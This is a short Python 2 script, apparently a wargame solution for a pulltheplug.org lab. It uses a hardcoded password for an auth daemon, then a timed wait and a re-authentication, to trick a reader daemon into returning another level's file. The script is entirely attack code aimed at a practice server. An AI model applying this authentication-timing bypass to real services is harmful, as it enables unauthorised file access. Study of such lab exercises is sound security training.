#!/usr/bin/python
import sys, os, time, socket

AUTH_HOST="brebera.labs.pulltheplug.org"
AUTH_PORT=24012
READER_HOST=AUTH_HOST
READER_PORT=24013
TARGET = "s13_foo.txt"

def authenticate(password="defamai"):
    print "Connecting to auth daemon."
    auth = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    auth.connect((AUTH_HOST,AUTH_PORT))
    print auth.recv(512)
    auth.send("%s\n" % password)
    auth.close()

def getfilelist():
    authenticate()
    reader = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    reader.connect((READER_HOST,READER_PORT))
    print reader.recv(512)
    reader.send("l\n")
    print "Waiting for files..."
    files=[]
    while True:
        tmp=reader.recv(512)
        if len(tmp)<=0:
            break
        files.append(tmp)
    return "".join(files)

def getfile(target):
    authenticate()
    print "Done. Connecting to reader daemon."
    reader = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    reader.connect((READER_HOST,READER_PORT))
    print reader.recv(512)
    reader.send("%s\0" % target)
    print reader.recv(512)
    print "Done. Waiting for timeout."
    time.sleep(310)
    print "Timeout."
    authenticate()
    print "Done. Requesting file."
    reader.send("y\n")
    return reader.recv(8000)

#print getfilelist()
print getfile(TARGET)
